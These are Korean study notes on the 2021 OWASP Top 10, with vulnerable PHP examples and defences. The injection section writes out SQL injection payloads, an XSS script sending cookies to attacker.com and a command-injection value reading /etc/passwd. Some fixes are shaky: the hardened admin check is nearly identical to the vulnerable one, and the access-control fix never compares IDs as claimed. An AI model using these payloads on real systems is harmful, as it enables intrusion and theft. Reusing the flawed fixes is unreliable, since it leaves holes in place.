# **2021 OWASP Top 10**

### 1. Broken Access Control, 취약한 접근 통제

**공격 방식**:

- 인증되지 않은 사용자가 권한이 필요한 리소스에 접근할 수 있다.
- 일반 사용자가 관리자 권한이 필요한 페이지를 열람하거나 기능을 실행할 수 있다.
- URL 매개변수(id, role 등)를 조작하여 다른 사용자의 정보를 조회하거나 수정할 수 있다.
- 클라이언트 측에서 권한 검사를 수행하여 이를 우회하는 공격이 가능하다.

<br>

**공격 시나리오**:

1. URL 조작을 통한 다른 사용자 정보 탈취의 경우

   웹 사이트에서 자신의 계정 정보만 볼 수 있어야 하는데, URL 매개변수를 변경하여 다른 사용자의 정보를 열람하는 공격이다.

   - 사용자가 자신의 프로필 페이지에 접근한다.

   ```bash
   GET /user/profile?id=1001
   ```

   - 공격자가 URL의 `id` 값을 변경하여 다른 사용자의 정보를 열람한다.

   ```bash
   GET /user/profile?id=1002
   ```

   - 서버에서 `id=1002`의 정보를 반환하는 경우, 공격자는 다른 사용자의 정보를 쉽게 조회할 수 있게 된다.

   <br>

   **취약한 코드 예시**

   ```php
   <?php
   // 사용자 정보 조회 API
   $id = $_GET['id']; // URL에서 ID를 직접 가져옴
   $sql = "SELECT * FROM users WHERE id = $id";
   $result = mysqli_query($conn, $sql);
   $user = mysqli_fetch_assoc($result);

   echo json_encode($user);
   ?>
   ```

   **문제점**

   - 서버가 로그인한 사용자의 `id`와 요청한 `id`가 일치하는지 확인하지 않는다.
   - 공격자는 단순히 `id` 값을 변경하는 것만으로 다른 사용자의 정보를 탈취 가능하다.

   <br>

   **방어 방법**:

   ```php
   <?php
   session_start();
   $user_id = $_SESSION['user_id']; // 로그인한 사용자의 ID

   $sql = "SELECT * FROM users WHERE id = ?";
   $stmt = $conn->prepare($sql);
   $stmt->bind_param("i", $user_id); // 세션에서 가져온 사용자 ID만 조회 가능
   $stmt->execute();
   $result = $stmt->get_result();
   $user = $result->fetch_assoc();

   echo json_encode($user);
   ?>
   ```

   - 로그인한 사용자의 `id`와 요청한 `id`가 일치하는지 확인한다.
   - SQL 바인딩을 사용하여 SQL Injection을 방지한다.

<br>
<br>

2. Privilege Escalation, 권한 상승 공격

   일반 사용자가 관리자 페이지에 접근하거나 관리자 권한을 획득하는 공격이다.

   일반 사용자가 `user` 역할을 가지고 있지만, 요청을 수정하여 `admin` 역할을 얻을 수 있는 경우가 존재한다.

   <br>

   **취약한 코드 예시**

   ```php
   <?php
   if ($_SESSION['role'] == 'admin') {
    echo "관리자 페이지에 접근할 수 있습니다.";
   } else {
    echo "접근 불가";
   }
   ?>
   ```

   **문제점**

   - 클라라이언트 측에서 세션 변수를 직접 변경할 가능성이 있다.
   - `role` 값이 클라이언트에서 조작될 경우 관리자 권한을 획득 가능하다.

   ```javascript
   document.cookie = "role=admin"; // 세션 조작
   ```

   이후 관리자 페이지에 다시 접속하면, 공격자가 관리자의 권한을 획득할 수 있다.

    <br>

   **방어 방법**:

   ```php
   <?php
   // 보안 강화된 접근 통제
   session_start();
   if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'admin') {
       die("접근이 거부되었습니다.");
   }
   echo "관리자 페이지입니다.";
   ?>
   ```

   - 세션 값은 서버에서만 관리하며, 클라이언트에서 임의로 수정할 수 없도록 작성한다.
   - 중요한 데이터는 클라이언트에서 직접 조작할 수 없도록 HTTPOnly 속성을 추가한다.

<br>

**방어 방법 요약**

- 클라이언트 검증만 믿지 않기, 서버 측에서 권한 확인
- 세션 기반 검증 사용 (`$_SESSION` 활용)
- RBAC 및 PBAC 적용
- URL 및 입력값 검증 철저 (예: `id` 변경 시 본인 정보만 조회 가능하도록 제한)
- 관리자 페이지 별도 보호 (예: `/admin` 경로 접근 제한)

<br>
<br>

---

### 2. Cryptographic Failures, 암호화 실패

**공격 방식**:

1. 민감한 데이터가 암호화되지 않음

   - 비밀번호, 신용카드 정보, 개인 식별 정보(PII, Personally Identifiable Information) 등이 암호화되지 않은 상태로 저장되거나 전송된다.
   - 데이터베이스에 평문(Plaintext) 비밀번호 저장의 경우,

   ```sql
   INSERT INTO users (username, password) VALUES ('admin', '123456');
   ```

   - 공격자가 데이터베이스에 접근하면 모든 계정의 비밀번호를 쉽게 확인할 수 있다.

2. 취약한 암호화 알고리즘 사용

   - 보안이 약한 알고리즘(MD5, SHA-1, DES 등)을 사용하면 공격자가 쉽게 복호화 가능하다.
   - MD5로 해시된 비밀번호는 레인보우 테이블 공격(Rainbow Table Attack)에 취약하다.

   ```php
   $hashed_password = md5('mypassword'); // 취약한 해시 알고리즘
   ```

   - MD5는 빠른 해싱 알고리즘이므로 사전 공격(Dictionary Attack)과 레인보우 테이블 공격에 의해 쉽게 뚫릴 수 있다.

3. HTTPS 미사용 (데이터 평문 전송)

   - 로그인 요청, 결제 정보 등이 HTTP(비보안 프로토콜)로 전송되면 중간자 공격(Man-in-the-Middle, MITM)에 노출될 수 있다.
   - 로그인 요청이 HTTP로 전송된다.

   ```sql
   POST http://example.com/login
   Content-Type: application/x-www-form-urlencoded

   username=admin&password=123456
   ```

   - 공격자가 네트워크에서 이 요청을 가로채면 계정 정보가 노출된다.

4. 하드코딩된 키 또는 재사용된 암호화 키 사용
   - 암호화 키를 코드에 직접 포함하면 소스 코드 유출 시 전체 보안이 깨진다.
   - 소스 코드 내 하드코딩된 API 키 및 암호화 키의 경우,
   ```php
   $encryption_key = "my_secret_key"; // 보안 문제 발생 가능
   ```
   - 키가 유출되면 모든 암호화된 데이터가 복호화될 위험이 존재한다.

<br>

**공격 시나리오**:

1. 네트워크 스니핑을 통한 로그인 정보 탈취

   사용자가 HTTP를 통해 로그인 요청을 보낸다.

   ```pgsql
   POST http://example.com/login
   Content-Type: application/x-www-form-urlencoded

   username=admin&password=123456
   ```

   공격자는 같은 네트워크에 연결된 상태에서 Packet Sniffing을 통해 평문 데이터를 가로챈다.

   가로챈 데이터를 분석하여 사용자의 로그인 정보를 확인하고 계정 탈취가 가능하다.

   <br>

   **방어 방법**:

   - HTTPS (TLS 1.2 이상)를 사용하여 데이터를 암호화한다.
   - 모든 요청을 HTTP → HTTPS로 강제 리디렉션한다.
   - Strict-Transport-Security(HSTS) 헤더를 적용하여 HTTPS 연결을 강제한다.

   ```apache
   Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
   ```

   <br>

2. 취약한 암호화 알고리즘 사용으로 비밀번호 복호화

   웹 사이트가 사용자의 비밀번호를 MD5 또는 SHA-1 해시 알고리즘으로 저장한다.

   공격자가 데이터베이스에서 `5f4dcc3b5aa765d61d8327deb882cf99` 값을 발견한다.

   해시 값을 레인보우 테이블을 이용해 복호화하여 `password123`임을 확인한다.

   공격자는 탈취한 비밀번호를 이용해 사용자 계정에 접근 가능해진다.

   <br>

   **방어 방법**:

   - bcrypt, Argon2 같은 강력한 해시 알고리즘을 사용히고, 가능하면 최신 표준인 Argon2를 우선적으로 적용한다.
   - Salt(임의의 난수 값) 추가로 동일한 비밀번호라도 해시값이 다르게 저장되도록 한다.

   ```PHP
   // bcrypt 적용
   $password = "mypassword";
   $hashed_password = password_hash($password, PASSWORD_BCRYPT);
   ```

<br>
<br>

---

### 3. Injection, 인젝션 공격

: 사용자 입력값이 제대로 검증되지 않은 채 코드로 실행되는 보안 취약점을 악용하는 공격 기법

**공격 방식**:

- SQL Injection → 데이터베이스 조작
- XSS(Cross-Site Scripting) → 웹 페이지에서 악성 스크립트 실행
- Command Injection → 시스템 명령어 실행

<br>

**공격 시나리오**:

1. SQL Injection

   - SQL 쿼리에 사용자의 입력값이 직접 포함될 때 발생한다.
   - 공격자는 입력값을 조작하여 데이터를 조회, 수정, 삭제하거나 관리자의 권한을 탈취할 수 있다.

   - 인증 우회(로그인 우회)의 경우,

     ```php
     <?php
     $id = $_POST['id'];
     $pw = $_POST['pw'];

     $query = "SELECT * FROM users WHERE id = '$id' AND pw = '$pw'";
     $result = mysqli_query($conn, $query);
     ?>
     ```

     - 위 코드는 사용자의 입력을 검증 없이 SQL 문에 직접 포함하여 취약점이 발생한다.

     ```sql
     ' OR '1'='1' --
     ```

     - 공격자는 다음과 같은 값을 입력한다.

     ```sql
     SELECT * FROM users WHERE id = '' OR '1'='1' -- ' AND pw = ''
     ```

     - `'1'='1'` 조건이 항상 참이 되므로 비밀번호 검증 없이 로그인이 가능해진다.

      <br>

     **방어 방법**:

     ```php
     <?php
     $stmt = $conn->prepare("SELECT * FROM users WHERE id = ? AND pw = ?");
     $stmt->bind_param("ss", $_POST['id'], $_POST['pw']);
     $stmt->execute();
     $result = $stmt->get_result();
     ?>
     ```

     - Prepared Statement를 사용하여 SQL Injection 공격을 방어할 수 있다.
     - `?` 플레이스홀더를 사용하여 사용자 입력을 안전하게 처리한다.

   <br>

   - 데이터 탈취의 경우,

     ```sql
     1 UNION SELECT username, password FROM users --
     ```

     ```sql
     SELECT * FROM products WHERE id = 1 UNION SELECT username, password FROM users --
     ```

     - 그 결과 DB의 `users` 테이블에서 모든 계정 정보가 노출된다.

      <br>

     **방어 방법**:

     ```php
     <?php
     // PHP에서 ORM (예: Laravel의 Eloquent) 사용
     $user = User::where('id', $id)->first();
     ?>
     ```

     - ORM을 사용하면 직접 SQL 쿼리를 작성하지 않고도 안전하게 데이터베이스를 조회할 수 있다.

<br>

2. XSS (Cross-Site Scripting)

   - 사용자가 입력한 값이 필터링되지 않고 그대로 웹 페이지에 출력될 때 발생한다.
   - 공격자는 악성 스크립트를 삽입하여 사용자의 세션 탈취, 피싱 공격 등을 수행할 수 있다.

   - 쿠키 탈취의 경우,

     ```php
     <?php
     echo "<p>".$_GET['message']."</p>";
     ?>
     ```

     - 취약한 코드는 위와 같다.

     ```html
     <script>
       document.location =
         "http://attacker.com/steal.php?cookie=" + document.cookie;
     </script>
     ```

     - 사용자의 로그인 쿠키가 `attacker.com` 으로 전송되며, 계정 탈취가 가능해진다.

      <br>

     **방어 방법**:

     ```php
     <?php
     echo "<p>" . htmlspecialchars($_GET['message'], ENT_QUOTES, 'UTF-8') . "</p>";
     ?>
     ```

     - `htmlspecialchars()`를 사용하면 HTML 태그가 일반 문자열로 변환되어 스크립트 실행이 차단된다.

      <br>

     ```html
     <meta
       http-equiv="Content-Security-Policy"
       content="default-src 'self'; script-src 'self'" />
     ```

     - 외부 스크립트 실행을 제한하여 XSS 공격을 방어할 수 있다.

<br>

3. Command Injection

   - 웹 애플리케이션이 시스템 명령어를 실행할 때 사용자의 입력을 직접 포함할 경우 발생한다.
   - 공격자는 임의의 명령어를 실행하여 서버를 제어할 수 있다.

   - 시스템 명령어 실행의 경우,

     ```php
     <?php
     $ip = $_GET['ip'];
     echo shell_exec("ping -c 4 " . $ip);
     ?>
     ```

     ```php
     127.0.0.1; cat /etc/passwd
     ```

     ```bash
     ping -c 4 127.0.0.1; cat /etc/passwd
     ```

     - `/etc/passwd` 파일이 출력되면서 서버 사용자 계정 정보가 노출될 수 있다.

      <br>

     **방어 방법**:

     ```php
     <?php
     $ip = escapeshellarg($_GET['ip']);
     echo shell_exec("ping -c 4 " . $ip);
     ?>
     ```

     - `escapeshellarg()`를 사용하면 사용자 입력값을 하나의 안전한 인자로 처리하여 명령어 삽입을 방지할 수 있다.

     ```php
     <?php
     if (preg_match('/^[0-9\.]+$/', $_GET['ip'])) {
        $ip = $_GET['ip'];
        echo shell_exec("ping -c 4 " . $ip);
     } else {
        echo "잘못된 입력입니다.";
     }
     ?>
     ```

     - 정규식을 사용하여 숫자와 점만 허용한다.
     - IP 주소 형식이 아닌 입력을 차단한다.

<br>
<br>

---

### 4. Insecure Design, 취약한 설계

**공격 방식**:

- 보안이 고려되지 않은 시스템 설계
- 비즈니스 로직이 예상치 못한 방식으로 악용 가능

**공격 시나리오**:
예를 들어, 사용자에게 1회만 제공되는 쿠폰을 여러 번 사용할 수 있도록 설계할 수 있다.

**방어 방법**:

- 보안 중심 설계 원칙 적용
- 위협 모델링 수행
- 보안 코드 리뷰 및 테스트 강화

<br>
<br>

### 5. Security Misconfiguration, 보안 설정 오류

**공격 방식**:

- 기본 관리자 계정 및 비밀번호 미변경
- 디버그 모드가 활성화된 상태로 운영
- 불필요한 포트 및 서비스 노출

**공격 시나리오**:
관리 페이지 `/admin`이 기본 계정 `admin:admin`으로 로그인이 가능하다.

**방어 방법**:

- 보안 설정 검토 및 최소 권한 원칙 적용
- 기본 계정 삭제 및 강력한 비밀번호 설정
- 보안 패치 및 업데이트 적용

<br>
<br>

### 6. Vulnerable and Outdated Components, 취약하고 오래된 구성 요소 사용

**공격 방식**:

- 오래된 라이브러리 및 프레임 워크 사용
- 알려진 보안 취약점이 있는 버전 사용

**공격 시나리오**:
Apache Struts의 취약점을 이용한 원격 코드 실행 (RCE) 공격이 있을 수 있다.

**방어 방법**:

- 최신 보안 패치 적용
- 의존성 검사 및 보안 업데이트 확인

<br>
<br>

### 7. Identification and Authentication Failures, 인증 및 식별 실패

**공격 방식**:

- 취약한 비밀번호 정책
- Multi-Factor Authentication (MFA) 미사용
- Brute Force 공격 가능

**공격 시나리오**:
사용자가 "password123" 같은 쉬운 비밀번호를 사용하여 계정이 탈취된다.

**방어 방법**:

- 강력한 비밀번호 정책 적용
- MFA 적용
- 로그인 시도 횟수 제한

<br>
<br>

### 8. Software and Data Integrity Failures, 소프트웨어 및 데이터 무결성 실패

**공격 방식**:

- 코드 또는 데이터가 무단으로 변경됨
- 악성 업데이트 파일 다운로드

**공격 시나리오**:
공격자가 CDN을 해킹하여 악성 JavaScript가 포함된 라이브러리를 제공한다.

**방어 방법**:

- 코드 서명 및 무결성 검증
- 안전한 업데이트 메커니즘 사용

<br>
<br>

### 9. Security Logging and Monitoring Failures, 보안 로깅 및 모니터링 실패

**공격 방식**:

- 보안 이벤트가 기록되지 않아 공격 탐지 불가능
- 실시간 모니터링 미비로 인한 대응 지연

**공격 시나리오**:
공격자가 1000번 이상 로그인 시도를 했지만, 로그가 남지 않아 탐지되지 않는다.

**방어 방법**:

- 로그 수집 및 분석 시스템 구축
- 침입 탐지 시스템(IDS) 및 보안 정보 이벤트 관리(SIEM) 도입

<br>
<br>

### 10. Server-Side Request Forgery, SSRF

**공격 방식**:

- 서버가 공격자의 요청을 대신 수행
- 내부 네트워크로의 접근 허용

**공격 시나리오**:
공격자가 `/fetch?url=http://internal/admin`을 요청하여 내부 관리자 페이지에 접근한다.

**방어 방법**:

- 외부 요청을 제한
- 화이트리스트 기반 접근 제어를 적용
